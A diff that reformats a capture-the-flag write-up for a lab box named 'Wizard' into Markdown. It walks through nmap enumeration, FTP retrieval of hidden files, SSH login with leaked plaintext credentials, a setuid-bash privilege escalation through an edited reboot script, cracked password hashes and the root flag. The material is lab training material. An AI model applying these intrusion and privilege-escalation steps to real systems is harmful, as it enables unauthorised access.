@@ -1,5 +1,7 @@
-Wizard
+# Wizard
 
+## Enumeration
+```bash
 └─$ nmap  -sV -A -p- -sC  10.10.197.180
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 14:30 BST
 Nmap scan report for 10.10.197.180
@@ -27,13 +29,18 @@ PORT   STATE SERVICE VERSION
 |   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
 |_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
+```
+## Exploitation
+```bash
 ftp 10.10.197.180
 
 get .hidden
 cd ...
 get reallyHidden
+```
 
+### On the ftp server I found the hagrid creds so i used it
+```bash
 sshpass -p 'IAlreadySaidTooMuch' ssh hagrid@10.10.197.180
 
 Matching Defaults entries for hagrid on hogwarts:
@@ -41,20 +48,26 @@ Matching Defaults entries for hagrid on hogwarts:
 
 User hagrid may run the following commands on hogwarts:
     (root) NOPASSWD: /sbin/reboot
-    
-    
- cd /home/harry
+```
+```bash
+cd /home/harry
  
- cat .ssh/id_rsa.pub :
- ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass
+cat .ssh/id_rsa.pub :
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass
+```
+## Privilege Escalation
 
+### I found a script, I used his vulnerability rights
+```
 vim /home/hagrid/hut.sh
 
 cp /bin/bash /home/hagrid
 chmod +xs bash
 
 sudo -u root /sbin/reboot
+```
 
+```bash
 cat dumbledore.txt : 
 e1f22cea2a1c41f047b36b505a6aede84a848209c69505ac17ffdaebd7ba63c98e69f68f755134d7b94d47d0c86c1aea72f39fa4e89457cf8b25f19cd1b2dd33 : peek
 
@@ -83,19 +96,24 @@ c9f4875d9269814e2ddf825ce769cb77702034225818d8cad8d46c6483693fa28b8d4e3e053d1fac
 b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 : password
 
 496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a : In fact, this was simple, truly, the password is ByMerlinBeard!
-
+```
+### After decrypt the hashes, I got the dumbledore password
+```
 su dumbledore : ByMerlinBeard!
+```
 
-linpeas : harry's id_rsa key
+### I launch a linpeas and I found the harry ssh private key
 
-connect as harry with id_rsa key
-
-linpeas
+### Connect as harry with id_rsa key
+```bash
+./linpeas
 
 sudo -h strawgoh /bin/bash
+```
 
-flag hash 53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d
+### I used cyberchef with magic to decrypt the root flag hash (53565a4a52564d324d315648546b56474e6a564455303957533064525746705353314a5156454e4f537a6448556c425555553161565539574d6b5244576c4e57536c4a5156456b7a5530564d4e544a45527a5255553064464e45565a5454493354314a5652454d7a556c705156555a425054303950513d3d): 
 
-cyberchef with magic : EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
+## Root FLAG
+Flag : EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
 
 
